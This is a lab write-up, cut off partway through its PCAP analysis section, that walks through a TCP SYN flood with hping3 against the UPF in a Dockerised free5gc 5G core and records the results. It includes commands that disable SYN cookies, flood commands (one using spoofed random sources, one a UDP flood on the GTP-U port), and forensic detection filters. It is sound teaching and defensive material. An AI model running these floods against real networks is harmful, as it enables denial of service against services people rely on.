# DoS Attack Lab: TCP SYN Flood on the 5G UPF (free5gc-compose)

> **Purpose**: This lab demonstrates how a TCP SYN Flood denial-of-service attack affects the User Plane Function (UPF) in a 5G core network. Students will learn to execute, observe, and mitigate such attacks within the free5gc-compose Docker environment.

> **Prerequisites**: Complete the [5G E2E Lab (Day 1)](./5G_E2E_free5GC_UERANSIM_Report.md) first. All containers must be running and the UE must have a successful PDU session.

> **Date Validated**: February 16, 2026 | **Environment**: free5gc v4.1.0 + UERANSIM v3.2.7 | **Host**: Ubuntu Linux 5.15.0

---

## Table of Contents

- [Architecture and Attack Topology](#architecture-and-attack-topology)
- [Network Function IP Reference](#network-function-ip-reference)
- [Step 1 — Start the Environment](#step-1--start-the-environment)
- [Step 2 — Retrieve Network Function IPs](#step-2--retrieve-network-function-ips)
- [Step 3 — Verify Baseline Connectivity](#step-3--verify-baseline-connectivity)
- [Step 4 — Start Traffic Capture on the UPF](#step-4--start-traffic-capture-on-the-upf)
- [Step 5 — Introduce the Vulnerability (Disable SYN Cookies)](#step-5--introduce-the-vulnerability-disable-syn-cookies)
- [Step 6 — Launch the TCP SYN Flood](#step-6--launch-the-tcp-syn-flood)
- [Step 7 — Observe the Impact in Real Time](#step-7--observe-the-impact-in-real-time)
- [Step 8 — Stop the Attack and Collect the PCAP](#step-8--stop-the-attack-and-collect-the-pcap)
- [Step 9 — PCAP Analysis (Before vs. After)](#step-9--pcap-analysis-before-vs-after)
- [Step 10 — Mitigation and Recovery](#step-10--mitigation-and-recovery)
- [Before vs. After — Full Comparison](#before-vs-after--full-comparison)
- [Discussion Questions](#discussion-questions)
- [Validation Checklist](#validation-checklist)
- [Troubleshooting Guide](#troubleshooting-guide)

---

## Architecture and Attack Topology

### 5G Core Network Layout (free5gc-compose)

```
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    Docker Network: privnet (10.100.200.0/24)            │
 │                    Bridge: br-free5gc                                   │
 │                                                                        │
 │  ┌──────────────────────── Control Plane ────────────────────────────┐  │
 │  │                                                                   │  │
 │  │  ┌─────┐  ┌─────┐  ┌─────┐  ┌─────┐  ┌─────┐  ┌─────┐         │  │
 │  │  │ NRF │  │ AMF │  │ SMF │  │ AUSF│  │ UDM │  │ UDR │         │  │
 │  │  │ .4  │  │ .16 │  │ .5  │  │ .9  │  │ .7  │  │ .8  │         │  │
 │  │  └─────┘  └──┬──┘  └──┬──┘  └─────┘  └─────┘  └─────┘         │  │
 │  │              │N2      │N4                                        │  │
 │  │              │(NGAP)  │(PFCP)                                    │  │
 │  └──────────────┼────────┼──────────────────────────────────────────┘  │
 │                 │        │                                              │
 │  ┌──────────────┼────────┼──── User Plane ──────────────────────────┐  │
 │  │              │        │                                           │  │
 │  │  ┌───────────┴────────┴──────────┐      ┌────────────────────┐  │  │
 │  │  │        gNB (UERANSIM)         │  N3  │       UPF          │  │  │
 │  │  │        10.100.200.13          ├──────┤   10.100.200.3     │  │  │
 │  │  │  gnb.free5gc.org             │GTP-U │   upf.free5gc.org  │  │  │
 │  │  │                               │:2152 │                    │  │  │
 │  │  │  ┌────────────────────┐       │      │   eth0 interface   │  │  │
 │  │  │  │  UE (nr-ue)        │       │      │                    │  │  │
 │  │  │  │  uesimtun0:        │       │      │   ┌──────────────┐ │  │  │
 │  │  │  │  10.60.0.1/16      │       │      │   │ UE IP Pool   │ │  │  │
 │  │  │  └────────────────────┘       │      │   │ 10.60.0.0/16 │ │  │  │
 │  │  └───────────────────────────────┘      │   │ 10.61.0.0/16 │ │  │  │
 │  │                                          │   └──────────────┘ │  │  │
 │  │                                          └────────────┬───────┘  │  │
 │  └───────────────────────────────────────────────────────┼──────────┘  │
 │                                                          │N6           │
 │                                                          │(Internet)   │
 └──────────────────────────────────────────────────────────┼─────────────┘
                                                            │
                                                       ┌────┴────┐
                                                       │ Internet│
                                                       │ 8.8.8.8 │
                                                       └─────────┘
```

### Attack Flow Diagram

```
  ATTACK PHASE (SYN Cookies OFF, No Firewall)
  ════════════════════════════════════════════

  UERANSIM (10.100.200.13)                    UPF (10.100.200.3)
  ┌─────────────────────┐                     ┌─────────────────────┐
  │                     │  SYN (port 80)      │                     │
  │  hping3 -S --flood  ├────────────────────>│  No service on :80  │
  │                     │  SYN (port 80)      │                     │
  │  876,389 SYN pkts   ├────────────────────>│  Kernel processes   │
  │  in 30 seconds      │  SYN (port 80)      │  each SYN packet    │
  │                     ├────────────────────>│                     │
  │  (~29,000 pkts/sec) │        ...           │  RST-ACK response   │
  │                     │<────────────────────┤  for every SYN      │
  │                     │  876,110 RSTs        │                     │
  │                     │                      │  CPU:  0% -> 4.18%  │
  │                     │                      │  MEM: 17MB -> 78MB  │
  │                     │                      │  NET: 19KB -> 50MB  │
  └─────────────────────┘                     └─────────────────────┘

  Result: UPF resources consumed processing/responding to flood.
          876,111 SYN in -> 876,110 RST out (1:1 ratio).


  MITIGATION PHASE (SYN Cookies ON + iptables Rate Limit)
  ═══════════════════════════════════════════════════════

  UERANSIM (10.100.200.13)                    UPF (10.100.200.3)
  ┌─────────────────────┐                     ┌─────────────────────┐
  │                     │  SYN (port 80)      │  ┌───────────────┐  │
  │  hping3 -S --flood  ├───────────────────> │  │  iptables     │  │
  │                     │  SYN (port 80)      │  │  rate limiter │  │
  │  812,966 SYN pkts   ├───────────────────> │  │               │  │
  │  in 15 seconds      │  SYN (port 80)      │  │ 10 SYN/sec   │  │
  │                     ├───────────────────> │  │ burst: 20     │  │
  │  (~54,000 pkts/sec) │                      │  │               │  │
  │                     │                      │  │ ACCEPT: 169   │  │
  │                     │<──── 170 RSTs ──────┤  │ DROP: 813,000 │  │
  │                     │                      │  └───────────────┘  │
  │                     │  812,797 DROPPED     │                     │
  │                     │  (never reach stack) │  CPU:  1.79%        │
  │                     │                      │  Legitimate traffic  │
  │                     │                      │  UNAFFECTED          │
  └─────────────────────┘                     └─────────────────────┘

  Result: 99.98% of attack traffic dropped at firewall.
          Only 169 of 812,966 packets reach the kernel.
          Legitimate ping via uesimtun0: 0% loss, ~21ms RTT.
```

### Packet-Level View: SYN Flood Anatomy

```
  Normal TCP 3-Way Handshake          SYN Flood (Attack)
  ═════════════════════════           ════════════════════

  Client         Server               Attacker         UPF
    │               │                    │               │
    │──── SYN ─────>│                    │──── SYN ─────>│  (random src port)
    │               │                    │──── SYN ─────>│  (random src port)
    │<── SYN-ACK ───│                    │──── SYN ─────>│  (random src port)
    │               │                    │──── SYN ─────>│  (random src port)
    │──── ACK ─────>│                    │──── SYN ─────>│  ...
    │               │                    │──── SYN ─────>│  876,389 times
    │ CONNECTION    │                    │               │
    │ ESTABLISHED   │                    │  NO SYN-ACK   │
    │               │                    │  (RST instead) │
    │<── DATA ─────>│                    │               │
    │               │                    │  RESOURCES     │
                                         │  EXHAUSTED     │
                                         │               │

  Source ports:  Fixed                Source ports:  2641, 2642, 2643...
  Duration:      ms                   Duration:      30 seconds
  Packets:       3                    Packets:       876,389
```

---

## Network Function IP Reference

### Docker Network

| Property       | Value                |
|----------------|----------------------|
| Network Name   | `privnet`            |
| Subnet         | `10.100.200.0/24`    |
| Bridge Name    | `br-free5gc`         |
| Gateway        | `10.100.200.1`       |

### Static IP Assignments (from `docker-compose.yaml`)

| Container  | Service         | IP Address         | DNS Alias            | Role           |
|------------|-----------------|--------------------|-----------------------|----------------|
| `amf`      | free5gc-amf     | `10.100.200.16`    | `amf.free5gc.org`     | AMF (N2)       |
| `n3iwf`    | free5gc-n3iwf   | `10.100.200.15`    | `n3iwf.free5gc.org`   | N3IWF          |
| `n3iwue`   | n3iwue          | `10.100.200.203`   | `n3ue.free5gc.org`    | Non-3GPP UE    |

### Dynamic IP Assignments (auto-assigned by Docker within `10.100.200.0/24`)

These containers resolve via Docker DNS aliases. Their actual IPs are assigned at startup.

| Container   | Service         | DNS Alias            | Role                        | Key Interface |
|-------------|-----------------|----------------------|-----------------------------|---------------|
| `upf`       | free5gc-upf     | `upf.free5gc.org`    | **UPF (attack target)**     | N3 (GTP-U)    |
| `ueransim`  | ueransim        | `gnb.free5gc.org`    | **gNB + UE (attack source)**| N3 (GTP-U)    |
| `smf`       | free5gc-smf     | `smf.free5gc.org`    | SMF                         | N4 (PFCP)     |
| `nrf`       | free5gc-nrf     | `nrf.free5gc.org`    | NRF                         | SBI           |
| `ausf`      | free5gc-ausf    | `ausf.free5gc.org`   | AUSF                        | SBI           |
| `udm`       | free5gc-udm     | `udm.free5gc.org`    | UDM                         | SBI           |
| `udr`       | free5gc-udr     | `udr.free5gc.org`    | UDR                         | SBI           |
| `nssf`      | free5gc-nssf    | `nssf.free5gc.org`   | NSSF                        | SBI           |
| `pcf`       | free5gc-pcf     | `pcf.free5gc.org`    | PCF                         | SBI           |
| `chf`       | free5gc-chf     | `chf.free5gc.org`    | CHF                         | SBI           |
| `nef`       | free5gc-nef     | `nef.free5gc.org`    | NEF                         | SBI           |
| `mongodb`   | db              | `db`                 | Database                    | —             |
| `webui`     | free5gc-webui   | `webui`              | Web Console                 | HTTP :5000     |

### N3 Interface (GTP-U — User Plane)

| Endpoint | Config File           | N3 Address        | Protocol     |
|----------|-----------------------|-------------------|--------------|
| UPF      | `config/upfcfg.yaml`  | `upf.free5gc.org` | GTP-U :2152  |
| gNB      | `config/gnbcfg.yaml`  | `gnb.free5gc.org` | GTP-U :2152  |

### UE IP Pool

| DNN       | CIDR            |
|-----------|-----------------|
| internet  | `10.60.0.0/16`  |
| internet  | `10.61.0.0/16`  |

---

## Step 1 — Start the Environment

```bash
cd ~/free5gc-compose
docker compose up -d
```

Wait ~15 seconds, then verify all containers:

```bash
docker compose ps
```

**Actual log:**

```
NAME       STATUS          SERVICE
amf        Up 31 seconds   free5gc-amf
ausf       Up 30 seconds   free5gc-ausf
chf        Up 22 seconds   free5gc-chf
mongodb    Up 33 seconds   db
n3iwf      Up 27 seconds   free5gc-n3iwf
n3iwue     Up 21 seconds   n3iwue
nef        Up 30 seconds   free5gc-nef
nrf        Up 32 seconds   free5gc-nrf
nssf       Up 31 seconds   free5gc-nssf
pcf        Up 30 seconds   free5gc-pcf
smf        Up 31 seconds   free5gc-smf
tngf       ...             free5gc-tngf
udm        Up 31 seconds   free5gc-udm
udr        Up 30 seconds   free5gc-udr
ueransim   Up 27 seconds   ueransim
upf        Up 33 seconds   free5gc-upf
webui      Up 30 seconds   free5gc-webui
```

> **Note**: `tngf` uses host networking and may show a different status — this is expected and does not affect the lab.

Verify the gNB registered with the AMF:

```bash
docker logs ueransim
```

**Actual log:**

```
UERANSIM v3.2.7
[2026-02-16 08:52:41.190] [sctp] [info] Trying to establish SCTP connection... (10.100.200.16:38412)
[2026-02-16 08:52:41.276] [sctp] [info] SCTP connection established (10.100.200.16:38412)
[2026-02-16 08:52:41.276] [sctp] [debug] SCTP association setup ascId[629116]
[2026-02-16 08:52:41.341] [ngap] [debug] Sending NG Setup Request
[2026-02-16 08:52:42.024] [ngap] [debug] NG Setup Response received
[2026-02-16 08:52:42.024] [ngap] [info] NG Setup procedure is successful
```

Now start the UE:

```bash
docker exec -d ueransim ./nr-ue -c ./config/uecfg.yaml
sleep 5
docker exec ueransim ip addr show uesimtun0
```

**Actual log:**

```
4: uesimtun0: <POINTOPOINT,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1400 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.60.0.1/16 scope global uesimtun0
       valid_lft forever preferred_lft forever
    inet6 fe80::dffb:7bd:48c:1b5b/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
```

**Checkpoint**: gNB is connected (NG Setup successful), UE has tunnel IP `10.60.0.1` on `uesimtun0`.

---

## Step 2 — Retrieve Network Function IPs

```bash
echo "=== free5gc Network Function IPs ==="
for container in upf ueransim amf smf nrf ausf udm udr nssf pcf chf nef n3iwf n3iwue mongodb webui; do
  IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$container" 2>/dev/null)
  printf "  %-12s  %s\n" "$container" "${IP:-NOT RUNNING}"
done
echo "===================================="
```

**Actual output:**

```
=== free5gc Network Function IPs ===
  upf           10.100.200.3         <-- ATTACK TARGET
  ueransim      10.100.200.13        <-- ATTACK SOURCE
  amf           10.100.200.16
  smf           10.100.200.5
  nrf           10.100.200.4
  ausf          10.100.200.9
  udm           10.100.200.7
  udr           10.100.200.8
  nssf          10.100.200.6
  pcf           10.100.200.11
  chf           10.100.200.14
  nef           10.100.200.12
  n3iwf         10.100.200.15
  n3iwue        10.100.200.203
  mongodb       10.100.200.2
  webui         10.100.200.10
====================================
```

Save the key IPs for the rest of the lab:

```bash
UPF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' upf)
UE_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ueransim)
echo "UPF_IP=$UPF_IP   UE_IP=$UE_IP"
```

> **Note**: Dynamic IPs may differ on your system. Always use the output of `docker inspect` — do NOT hardcode IPs.

---

## Step 3 — Verify Baseline Connectivity

### 3.1 Ping the UPF from UERANSIM (Control Plane Network)

```bash
docker exec ueransim ping -c 5 $UPF_IP
```

**Actual log:**

```
PING 10.100.200.3 (10.100.200.3) 56(84) bytes of data.
64 bytes from 10.100.200.3: icmp_seq=1 ttl=64 time=0.472 ms
64 bytes from 10.100.200.3: icmp_seq=2 ttl=64 time=0.131 ms
64 bytes from 10.100.200.3: icmp_seq=3 ttl=64 time=0.182 ms
64 bytes from 10.100.200.3: icmp_seq=4 ttl=64 time=0.140 ms
64 bytes from 10.100.200.3: icmp_seq=5 ttl=64 time=0.141 ms

--- 10.100.200.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4095ms
rtt min/avg/max/mdev = 0.131/0.213/0.472/0.130 ms
```

### 3.2 Ping External Host via Data Plane (GTP-U Tunnel)

```bash
docker exec ueransim ping -c 5 -I uesimtun0 8.8.8.8
```

**Actual log:**

```
PING 8.8.8.8 (8.8.8.8) from 10.60.0.1 uesimtun0: 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=18.4 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=20.0 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=111 time=17.5 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=111 time=19.1 ms
64 bytes from 8.8.8.8: icmp_seq=5 ttl=111 time=21.6 ms

--- 8.8.8.8 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 17.510/19.326/21.619/1.410 ms
```

### 3.3 UPF Resource Baseline

```bash
docker stats upf --no-stream
```

**Actual log:**

```
CONTAINER ID   NAME   CPU %   MEM USAGE / LIMIT     MEM %   NET I/O          BLOCK I/O   PIDS
0d3ad3aede18   upf    0.00%   17.02MiB / 251.5GiB   0.01%   19.1kB / 1.77kB  25MB / 0B   19
```

### Baseline Summary

```
  ┌─────────────────────────────────────────────────────────┐
  │              BASELINE (Before Attack)                    │
  ├──────────────────────────────┬──────────────────────────┤
  │  Ping RTT to UPF             │  0.21 ms avg, 0% loss   │
  │  Ping RTT to 8.8.8.8 (tun)  │  19.3 ms avg, 0% loss   │
  │  UPF CPU                     │  0.00%                   │
  │  UPF Memory                  │  17.02 MiB               │
  │  UPF Network I/O (in/out)   │  19.1 kB / 1.77 kB      │
  │  UPF PIDs                    │  19                      │
  └──────────────────────────────┴──────────────────────────┘
```

---

## Step 4 — Start Traffic Capture on the UPF

> **IMPORTANT**: The UPF container (`free5gc/upf:v4.1.0`) is a minimal Debian image. It does NOT come with `tcpdump` pre-installed. You must install it first. See [Troubleshooting](#ts-1-tcpdump-not-found-in-upf-container) if you skip this.

### 4.1 Install tcpdump in the UPF container

```bash
docker exec upf bash -c "apt-get update -qq && apt-get install -y -qq tcpdump"
```

### 4.2 Identify the UPF interface

```bash
docker exec upf ip -brief addr show eth0
```

**Actual log:**

```
eth0@if6967      UP             10.100.200.3/24
```

### 4.3 Start the capture

> **IMPORTANT**: You must use `-Z root` to avoid permission denied errors. The default `tcpdump` user cannot write to `/tmp`. See [Troubleshooting](#ts-3-tcpdump-permission-denied) if you hit this.

```bash
docker exec upf bash -c "tcpdump -i eth0 -w /tmp/dos_attack_capture.pcap tcp -Z root &"
```

**Actual log:**

```
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Verify it is running:

```bash
docker top upf | grep tcpdump
```

**Actual log:**

```
root   2495714   2486212   0   14:25   ?   00:00:00   tcpdump -i eth0 -w /tmp/dos_attack_capture.pcap tcp -Z root
```

---

## Step 5 — Introduce the Vulnerability (Disable SYN Cookies)

> **IMPORTANT**: The UPF container does NOT come with `sysctl` pre-installed. You must install the `procps` package first. See [Troubleshooting](#ts-2-sysctl-not-found-in-upf-container).

### 5.1 Install procps (provides sysctl and ps)

```bash
docker exec upf bash -c "apt-get install -y -qq procps"
```

### 5.2 Disable SYN cookies and reduce SYN backlog

```bash
# Check current value
docker exec upf sysctl net.ipv4.tcp_syncookies
# Output: net.ipv4.tcp_syncookies = 1

# Disable SYN cookies
docker exec upf sysctl -w net.ipv4.tcp_syncookies=0
# Output: net.ipv4.tcp_syncookies = 0

# Reduce SYN backlog to make exhaustion faster
docker exec upf sysctl -w net.ipv4.tcp_max_syn_backlog=128
# Output: net.ipv4.tcp_max_syn_backlog = 128
```

**Actual log:**

```
--- Current SYN cookies setting ---
net.ipv4.tcp_syncookies = 1

--- Disabling SYN cookies ---
net.ipv4.tcp_syncookies = 0

--- Reducing SYN backlog ---
net.ipv4.tcp_max_syn_backlog = 128

--- Verification ---
net.ipv4.tcp_syncookies = 0
net.ipv4.tcp_max_syn_backlog = 128
```

> **Why this matters**: SYN cookies let the kernel handle SYN floods without storing state for half-open connections. Disabling them means every inbound SYN allocates memory in the connection table, leading to resource exhaustion.

---

## Step 6 — Launch the TCP SYN Flood

### 6.1 Install `hping3` in the UERANSIM Container

> **IMPORTANT**: The UERANSIM container does NOT come with `hping3`. You must install it first.

```bash
docker exec ueransim bash -c "apt-get update -qq && apt-get install -y -qq hping3"
```

> If the image is Alpine-based instead of Debian, use `apk add --no-cache hping3`. See [Troubleshooting](#ts-4-hping3-installation-fails).

### 6.2 Execute the SYN Flood

```bash
# Launch with a 30-second timeout (adjust as needed)
docker exec -d ueransim bash -c "timeout 30 hping3 -S --flood -p 80 $UPF_IP > /tmp/hping3_output.txt 2>&1"
```

**Flag explanation:**

| Flag       | Meaning                                               |
|------------|-------------------------------------------------------|
| `-S`       | Sets the TCP SYN flag on each packet                  |
| `--flood`  | Sends packets at maximum rate (no reply wait)         |
| `-p 80`    | Targets port 80 (substitute any port)                 |
| `timeout 30` | Auto-stop after 30 seconds                         |

Verify the attack is running:

```bash
docker top ueransim | grep hping
```

**Actual log:**

```
root   2498203   2498197   97   14:26   ?   00:00:22   hping3 -S --flood -p 80 10.100.200.3
```

> Note the **97% CPU** usage on the UERANSIM side — `hping3 --flood` saturates one core.

### 6.3 Alternative Attack Variants

```bash
# UDP flood targeting GTP-U port (more realistic 5G attack)
docker exec -d ueransim bash -c "timeout 15 hping3 --udp --flood -p 2152 $UPF_IP"

# SYN flood with spoofed source IPs (harder to filter)
docker exec -d ueransim bash -c "timeout 15 hping3 -S --flood -p 80 --rand-source $UPF_IP"
```

---

## Step 7 — Observe the Impact in Real Time

While the attack is running (within the 30-second window), open **separate terminals** and run:

### 7.1 Monitor UPF Resource Usage

```bash
docker stats upf --no-stream
```

**Actual log (during attack):**

```
CONTAINER ID   NAME   CPU %   MEM USAGE / LIMIT     MEM %   NET I/O           BLOCK I/O        PIDS
0d3ad3aede18   upf    4.18%   72.59MiB / 251.5GiB   0.03%   12MB / 9.06MB     133MB / 69.7MB   26
```

Second sample (later in attack):

```
CONTAINER ID   NAME   CPU %   MEM USAGE / LIMIT     MEM %   NET I/O           BLOCK I/O       PIDS
0d3ad3aede18   upf    0.00%   77.98MiB / 251.5GiB   0.03%   50.3MB / 47.4MB   133MB / 522MB   29
```

### 7.2 Check Kernel TCP Counters

```bash
docker exec upf bash -c "cat /proc/net/snmp" | grep "^Tcp"
```

**Actual log:**

```
Tcp: RtoAlgorithm RtoMin RtoMax MaxConn ActiveOpens PassiveOpens AttemptFails EstabResets CurrEstab InSegs OutSegs RetransSegs InErrs OutRsts InCsumErrors
Tcp: 1 200 120000 -1 5 0 0 0 0 876601 876571 0 0 876109 0
```

**Key counters explained:**

```
  ┌──────────────────────────────────────────────────────────┐
  │  TCP Kernel Counter       Value        Meaning           │
  ├──────────────────────────────────────────────────────────┤
  │  InSegs                   876,601      SYN packets in    │
  │  OutSegs                  876,571      RST packets out   │
  │  OutRsts                  876,109      RST flags sent    │
  │  PassiveOpens             0            No connections    │
  │  CurrEstab                0            established       │
  │  InErrs                   0            No checksum errs  │
  └──────────────────────────────────────────────────────────┘
```

### 7.3 Test Legitimate Traffic During Attack

```bash
docker exec ueransim ping -c 3 -W 3 -I uesimtun0 8.8.8.8
```

**Actual log:**

```
PING 8.8.8.8 (8.8.8.8) from 10.60.0.1 uesimtun0: 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=20.9 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=20.5 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=111 time=19.0 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 18.967/20.125/20.944/0.842 ms
```

> **Observation**: Data-plane ping via `uesimtun0` still works because the SYN flood targets TCP port 80, while GTP-U runs over UDP port 2152. In a production attack targeting the actual service ports or exhausting all kernel resources, this traffic would also be affected.

---

## Step 8 — Stop the Attack and Collect the PCAP

### 8.1 Wait for attack to finish (or stop manually)

```bash
# If using timeout, wait for it to complete, then read results:
docker exec ueransim cat /tmp/hping3_output.txt

# Or stop manually:
docker exec ueransim pkill hping3
```

**Actual attack results log:**

```
hping in flood mode, no replies will be shown

--- 10.100.200.3 hping statistic ---
876389 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
HPING 10.100.200.3 (eth0 10.100.200.3): S set, 40 headers + 0 data bytes
```

### 8.2 Stop tcpdump

```bash
docker exec upf killall tcpdump
```

### 8.3 Extract the PCAP

```bash
docker cp upf:/tmp/dos_attack_capture.pcap ./dos_attack_capture.pcap
ls -lh dos_attack_capture.pcap
```

**Actual log:**

```
-rw-r--r-- 1 arjit arjit 118M Feb 16 14:27 dos_attack_capture.pcap
```

---

## Step 9 — PCAP Analysis (Before vs. After)

### 9.1 Unmitigated PCAP Summary (`dos_attack_capture.pcap`)

```
  ┌─────────────────────────────────────────────────────────────┐
  │  PCAP: dos_attack_capture.pcap (UNMITIGATED)               │
  ├────────────────────────────┬────────────────────────────────┤
  │  File Size                 │  118 MB (123 MB on disk)       │
  │  Total Packets             │  1,752,340                     │
  │  Capture Duration          │  44.3 seconds                  │
  │  Average Packet Rate       │  ~39,000 packets/sec           │
  │  Average Packet Size       │  54.59 bytes                   │
  │  Data Bit Rate             │  17 Mbps                       │
  ├────────────────────────────┼────────────────────────────────┤
  │  SYN packets (attack)      │  876,111                       │
  │  RST-ACK packets (response)│  876,110                       │
  │  SYN:RST Ratio             │  1:1 (every SYN gets a RST)   │
  │  SYN-ACK packets           │  0 (no service on port 80)    │
  └────────────────────────────┴────────────────────────────────┘
```

**First packets captured (normal traffic before the flood):**

```
14:26:07.029 IP 10.100.200.3.53574 > 167.82.58.132.http: Flags [S], seq 3799563617, win 64240, length 0
14:26:07.034 IP 167.82.58.132.http > 10.100.200.3.53574: Flags [S.], seq 1994831063, ack 3799563618, win 65535, length 0
14:26:07.034 IP 10.100.200.3.53574 > 167.82.58.132.http: Flags [.], ack 1, win 63, length 0
14:26:07.034 IP 10.100.200.3.53574 > 167.82.58.132.http: Flags [P.], seq 1:157, ack 1, win 63, length 156: HTTP: GET /debian/pool/...
```

> **Note**: The first few packets are legitimate apt-get HTTP traffic (from installing tcpdump). This gives a clear "normal traffic" baseline in the capture.

**Attack traffic (SYN flood begins):**

```
14:26:21.xxx IP 10.100.200.13.2641 > 10.100.200.3.http: Flags [S], seq 329743345, win 512, length 0
14:26:21.xxx IP 10.100.200.3.http > 10.100.200.13.2641: Flags [R.], seq 0, ack 329743346, win 0, length 0
14:26:21.xxx IP 10.100.200.13.2642 > 10.100.200.3.http: Flags [S], seq 1127249565, win 512, length 0
14:26:21.xxx IP 10.100.200.3.http > 10.100.200.13.2642: Flags [R.], seq 0, ack 1127249566, win 0, length 0
  ... (continues for 876,389 SYN packets over ~30 seconds) ...
```

**Last packets (tail of the flood):**

```
14:26:51.347 IP 10.100.200.13.25819 > 10.100.200.3.http: Flags [S], seq 961769782, win 512, length 0
14:26:51.347 IP 10.100.200.3.http > 10.100.200.13.25819: Flags [R.], seq 0, ack 77984325, win 0, length 0
14:26:51.347 IP 10.100.200.13.25820 > 10.100.200.3.http: Flags [S], seq 997691989, win 512, length 0
14:26:51.347 IP 10.100.200.3.http > 10.100.200.13.25820: Flags [R.], seq 0, ack 3869945092, win 0, length 0
14:26:51.347 IP 10.100.200.13.25821 > 10.100.200.3.http: Flags [S], seq 697460236, win 512, length 0
14:26:51.347 IP 10.100.200.3.http > 10.100.200.13.25821: Flags [R.], seq 0, ack 3571645306, win 0, length 0
```

**Forensic indicators in the unmitigated PCAP:**

```
  ┌───────────────────────────────────────────────────────────────┐
  │  INDICATOR                      │  VALUE                      │
  ├───────────────────────────────────────────────────────────────┤
  │  Single source IP               │  10.100.200.13              │
  │  Single destination port        │  80 (http)                  │
  │  Source ports                    │  Sequential (2641→25821)    │
  │  TCP window size                │  512 (hping3 signature)     │
  │  Packet size                    │  54 bytes (min TCP SYN)     │
  │  SYN flag only (no ACK)         │  100% of inbound traffic    │
  │  No completed handshakes        │  0 ESTABLISHED connections  │
  │  Packet rate                    │  ~29,000 SYN/sec            │
  └───────────────────────────────────────────────────────────────┘
```

### 9.2 Mitigated PCAP Summary (`dos_mitigated_capture.pcap`)

```
  ┌─────────────────────────────────────────────────────────────┐
  │  PCAP: dos_mitigated_capture.pcap (WITH MITIGATION)        │
  ├────────────────────────────┬────────────────────────────────┤
  │  File Size                 │  55 MB                         │
  │  Total Packets             │  813,137                       │
  │  Capture Duration          │  ~15 seconds                   │
  │  Average Packet Rate       │  ~54,000 packets/sec           │
  ├────────────────────────────┼────────────────────────────────┤
  │  SYN packets (attack)      │  812,968                       │
  │  RST-ACK packets (response)│  170                           │
  │  SYN:RST Ratio             │  4,782:1 (most SYNs dropped)  │
  │  SYN-ACK packets           │  0                             │
  └────────────────────────────┴────────────────────────────────┘
```

**Key difference**: In the mitigated capture, `tcpdump` still sees all SYN packets arriving at `eth0` (before iptables), but the UPF kernel only processes 170 of them. The remaining 812,798 are DROPped by the iptables rule.

### 9.3 PCAP Comparison: Unmitigated vs. Mitigated

```
  UNMITIGATED (no defenses)              MITIGATED (SYN cookies + iptables)
  ════════════════════════               ═══════════════════════════════════

  dos_attack_capture.pcap                dos_mitigated_capture.pcap
  ┌──────────────────────┐               ┌──────────────────────┐
  │ Size: 118 MB         │               │ Size: 55 MB          │
  │ Duration: 44.3 sec   │               │ Duration: ~15 sec    │
  │ Packets: 1,752,340   │               │ Packets: 813,137     │
  ├──────────────────────┤               ├──────────────────────┤
  │ SYN in:   876,111    │               │ SYN in:   812,968    │
  │ RST out:  876,110    │               │ RST out:  170        │
  │ Ratio:    1:1        │               │ Ratio:    4,782:1    │
  ├──────────────────────┤               ├──────────────────────┤
  │ UPF processed ALL    │               │ iptables dropped     │
  │ 876K SYN packets     │               │ 99.98% of SYNs       │
  │                      │               │ Only 170 reached     │
  │ CPU: 4.18%           │               │ kernel stack          │
  │ MEM: 78 MiB          │               │                      │
  │ NET: 50 MB in/out    │               │ CPU: 1.79%           │
  └──────────────────────┘               │ MEM: 73 MiB          │
                                          │ NET: 84 MB in (*)    │
                                          └──────────────────────┘

  (*) Higher NET in because tcpdump captures at the interface level
      (before iptables), so all packets are counted in Docker stats.

  ┌──────────────────────────────────────────────────────────────┐
  │  COMPARISON TABLE                                            │
  ├────────────────────────┬──────────────┬──────────────────────┤
  │  Metric                │  Unmitigated │  Mitigated           │
  ├────────────────────────┼──────────────┼──────────────────────┤
  │  Attack duration       │  30 sec      │  15 sec              │
  │  SYN packets sent      │  876,389     │  812,966             │
  │  SYN packets rate      │  ~29K/sec    │  ~54K/sec            │
  │  RST responses from UPF│  876,110     │  170                 │
  │  % SYNs reaching stack │  100%        │  0.02%               │
  │  % SYNs dropped        │  0%          │  99.98%              │
  │  UPF CPU during attack │  4.18%       │  1.79%               │
  │  UPF memory            │  78 MiB      │  73 MiB              │
  │  Legitimate ping loss  │  0% (*)      │  0%                  │
  │  Legitimate ping RTT   │  20.1 ms     │  20.8 ms             │
  │  PCAP file size        │  118 MB      │  55 MB               │
  └────────────────────────┴──────────────┴──────────────────────┘
  (*) TCP flood on port 80 did not directly impact UDP-based GTP-U.
```

### 9.4 Wireshark Analysis Guide

Open either PCAP in Wireshark:

```bash
wireshark dos_attack_capture.pcap &
```

**Useful display filters:**

| Filter | Purpose |
|--------|---------|
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | SYN-only packets (attack traffic) |
| `tcp.flags.syn == 1 && tcp.flags.ack == 1` | SYN-ACK responses (should be 0) |
| `tcp.flags.reset == 1` | RST packets (UPF responses) |
| `ip.src == 10.100.200.13` | All traffic from attacker |
| `ip.dst == 10.100.200.3 && tcp.dstport == 80` | All traffic to target |
| `tcp.window_size == 512` | hping3 signature (default window) |
